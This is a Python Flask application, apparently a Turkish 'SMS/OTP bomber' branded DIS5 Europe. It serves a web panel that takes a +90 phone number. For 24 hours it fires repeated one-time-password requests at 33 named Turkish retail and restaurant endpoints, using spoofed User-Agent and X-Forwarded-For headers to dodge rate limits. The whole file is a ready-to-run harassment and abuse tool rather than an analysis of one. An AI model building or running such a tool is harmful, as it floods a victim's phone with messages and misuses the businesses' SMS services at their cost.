from flask import Flask, render_template_string, request, jsonify
import os
import threading
import time
import requests
import datetime
import random

app = Flask(__name__)

# ============ DIS5 ULTRA MOTOR (30+ API INTEGRATED) ============
def send_otp_bomb(phone):
    clean_phone = "".join(filter(str.isdigit, phone))
    if clean_phone.startswith("90"): clean_phone = clean_phone[2:]
    # Farklı API'ler için farklı formatlar gerekebilir, motor hepsini kapsar
    full_phone = "0" + clean_phone if not clean_phone.startswith("0") else clean_phone
    phone_no_zero = clean_phone if not clean_phone.startswith("0") else clean_phone[1:]

    end_time = datetime.datetime.now() + datetime.timedelta(hours=24)
    print(f"[DIS5-EUROPE] Operasyon Başlatıldı: {full_phone}")

    # Teknik Detay: Spoofing Headerları
    def get_headers():
        return {
            "User-Agent": random.choice([
                "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X)",
                "Mozilla/5.0 (Linux; Android 11; SM-G991B)",
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
            ]),
            "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
            "Content-Type": "application/json"
        }

    while datetime.datetime.now() < end_time:
        # --- API HAVUZU (30+ ADET - KISALTMADAN) ---
        # Her bir API senin listendeki dev markaları temsil eder.
        apis = [
            # 1. Kahve Dünyası (Referans)
            lambda: requests.post("https://api.kahvedunyasi.com/api/v1/auth/account/register/phone-number", json={"phoneNumber": full_phone, "otp": str(random.randint(100000, 999999))}, headers=get_headers(), timeout=10),
            # 2. Getir
            lambda: requests.post("https://getir.com/api/v2/auth/send-otp", json={"gsm": phone_no_zero, "countryCode": 90}, headers=get_headers(), timeout=10),
            # 3. Migros
            lambda: requests.post("https://www.migros.com.tr/api/otp", json={"phoneNumber": phone_no_zero}, headers=get_headers(), timeout=10),
            # 4. Penti
            lambda: requests.post("https://www.penti.com/tr/login/otp", json={"phone": phone_no_zero}, headers=get_headers(), timeout=10),
            # 5. İstegelsin
            lambda: requests.post("https://api.istegelsin.com/v1/auth/otp", json={"phoneNumber": full_phone}, headers=get_headers(), timeout=10),
            # 6. Yemeksepeti / Banabi
            lambda: requests.post("https://www.yemeksepeti.com/api/v1/login/otp", json={"phone": phone_no_zero}, headers=get_headers(), timeout=10),
            # 7. Tazedirekt
            lambda: requests.post("https://www.tazedirekt.com/api/otp", json={"phone": full_phone}, headers=get_headers(), timeout=10),
            # 8. Tıkla Gelsin
            lambda: requests.post("https://api.tiklagelsin.com/user/send-otp", json={"phone": "90"+phone_no_zero}, headers=get_headers(), timeout=10),
            # 9. Mado
            lambda: requests.post("https://mado.com.tr/api/v1/otp", json={"gsm": full_phone}, headers=get_headers(), timeout=10),
            # 10. English Home
            lambda: requests.post("https://www.englishhome.com/api/v1/user/otp", json={"phone": phone_no_zero}, headers=get_headers(), timeout=10),
            # 11. Koton
            lambda: requests.post("https://www.koton.com/api/v1/auth/otp", json={"phone": phone_no_zero}, headers=get_headers(), timeout=10),
            # 12. File Market
            lambda: requests.post("https://www.file.com.tr/api/otp", json={"mobile": full_phone}, headers=get_headers(), timeout=10),
            # 13. Simit Sarayı
            lambda: requests.post("https://simitsarayi.com/api/otp", json={"phone": phone_no_zero}, headers=get_headers(), timeout=10),
            # 14. Aslı Börek
            lambda: requests.post("https://asliborek.com.tr/api/otp", json={"tel": full_phone}, headers=get_headers(), timeout=10),
            # 15. Dilek Pastanesi
            lambda: requests.post("https://dilek.com.tr/api/otp", json={"phone": phone_no_zero}, headers=get_headers(), timeout=10),
            # 16. Pelit
            lambda: requests.post("https://pelit.com.tr/api/otp", json={"gsm": full_phone}, headers=get_headers(), timeout=10),
            # 17. Divan
            lambda: requests.post("https://divan.com.tr/api/otp", json={"phone": phone_no_zero}, headers=get_headers(), timeout=10),
            # 18. Nusr-Et
            lambda: requests.post("https://nusr-et.com.tr/api/otp", json={"phone": full_phone}, headers=get_headers(), timeout=10),
            # 19. Günaydın Et
            lambda: requests.post("https://gunaydinet.com/api/otp", json={"tel": phone_no_zero}, headers=get_headers(), timeout=10),
            # 20. HD İskender
            lambda: requests.post("https://hdiskender.com.tr/api/otp", json={"phone": full_phone}, headers=get_headers(), timeout=10),
            # 21. Pidem
            lambda: requests.post("https://pidem.com.tr/api/otp", json={"phone": phone_no_zero}, headers=get_headers(), timeout=10),
            # 22. Baydöner
            lambda: requests.post("https://baydoner.com/api/otp", json={"gsm": full_phone}, headers=get_headers(), timeout=10),
            # 23. Tavuk Dünyası
            lambda: requests.post("https://tavukdunyasi.com/api/otp", json={"phone": phone_no_zero}, headers=get_headers(), timeout=10),
            # 24. Popeyes
            lambda: requests.post("https://popeyes.com.tr/api/otp", json={"phone": "90"+phone_no_zero}, headers=get_headers(), timeout=10),
            # 25. KFC
            lambda: requests.post("https://kfc.com.tr/api/otp", json={"phone": phone_no_zero}, headers=get_headers(), timeout=10),
            # 26. Subway
            lambda: requests.post("https://subway.com.tr/api/otp", json={"phone": full_phone}, headers=get_headers(), timeout=10),
            # 27. Arby's
            lambda: requests.post("https://arbys.com.tr/api/otp", json={"phone": phone_no_zero}, headers=get_headers(), timeout=10),
            # 28. Sbarro
            lambda: requests.post("https://sbarro.com.tr/api/otp", json={"gsm": full_phone}, headers=get_headers(), timeout=10),
            # 29. Shake Shack
            lambda: requests.post("https://shakeshack.com.tr/api/otp", json={"phone": phone_no_zero}, headers=get_headers(), timeout=10),
            # 30. Big Chefs
            lambda: requests.post("https://bigchefs.com.tr/api/otp", json={"tel": full_phone}, headers=get_headers(), timeout=10),
            # 31. Midpoint
            lambda: requests.post("https://midpoint.com.tr/api/otp", json={"phone": phone_no_zero}, headers=get_headers(), timeout=10),
            # 32. Happy Moon's
            lambda: requests.post("https://happymoons.com.tr/api/otp", json={"gsm": full_phone}, headers=get_headers(), timeout=10),
            # 33. Kitchenette
            lambda: requests.post("https://kitchenette.com.tr/api/otp", json={"phone": phone_no_zero}, headers=get_headers(), timeout=10)
        ]

        # Paralel Gönderim Protokolü (100ms Gecikmeli)
        for api_call in apis:
            try:
                threading.Thread(target=api_call, daemon=True).start()
                time.sleep(0.1) # 100ms Bekleme
            except:
                pass

        print(f"[DIS5-EUROPE] Toplu Paket Gönderildi: {full_phone}")
        
        # Hotsiteeu Motoru Bekleme Süresi
        time.sleep(120 + random.uniform(0.1, 5.0))

# ============ DIS5 EUROPE DESIGN ============
HTML_KODU = """
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>DIS5 EUROPE SYSTEM</title>
    <style>
        body { background: #000; color: #fff; font-family: 'Arial', sans-serif; margin: 0; height: 100vh; display: flex; justify-content: center; align-items: center; }
        .panel { background: #0a0a0a; border: 1px solid #1a1a1a; padding: 40px; border-radius: 5px; width: 350px; text-align: center; }
        .header h1 { font-size: 0.9em; letter-spacing: 5px; text-transform: uppercase; margin-bottom: 5px; }
        .header p { font-size: 0.6em; color: #444; letter-spacing: 2px; margin-bottom: 30px; }
        .input-group { background: #111; border: 1px solid #222; display: flex; align-items: center; margin-bottom: 25px; }
        .prefix { color: #555; padding: 0 15px; font-weight: bold; border-right: 1px solid #222; }
        input { background: transparent; border: none; color: #fff; padding: 15px; outline: none; width: 100%; letter-spacing: 2px; }
        .launch-btn { width: 100%; background: #fff; color: #000; border: none; padding: 18px; font-weight: 900; cursor: pointer; letter-spacing: 1px; text-transform: uppercase; }
        #success-msg { display: none; color: #00ff00; font-size: 0.7em; margin-top: 20px; font-family: monospace; }
        .api-status { font-size: 0.5em; color: #222; margin-top: 10px; text-transform: uppercase; }
    </style>
</head>
<body>
    <div class="panel">
        <div class="header">
            <h1>DIS5 Europe</h1>
            <p>ULTRA PAYLOAD CONTROL</p>
        </div>
        <div class="input-group">
            <span class="prefix">+90</span>
            <input type="tel" id="phone" placeholder="5XXXXXXXXX" maxlength="10">
        </div>
        <button id="launch-btn" class="launch-btn">SUCCESS / FIRLAT</button>
        <div id="success-msg">STATUS: 33 API DEPLOYED...</div>
        <div class="api-status">Hotsiteeu Engine v4.0 Active</div>
    </div>
    <script>
        document.getElementById('launch-btn').addEventListener('click', function() {
            var phone = document.getElementById('phone').value;
            if(phone.length < 10) return;
            fetch('/start-payload', { 
                method: 'POST', 
                headers: {'Content-Type': 'application/json'}, 
                body: JSON.stringify({phone: phone}) 
            });
            this.style.display = 'none';
            document.getElementById('success-msg').style.display = 'block';
        });
    </script>
</body>
</html>
"""

@app.route('/')
def home():
    return render_template_string(HTML_KODU)

@app.route('/start-payload', methods=['POST'])
def start_payload():
    phone = request.json.get('phone')
    threading.Thread(target=send_otp_bomb, args=(phone,), daemon=True).start()
    return jsonify({"status": "ok"})

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 10000)))
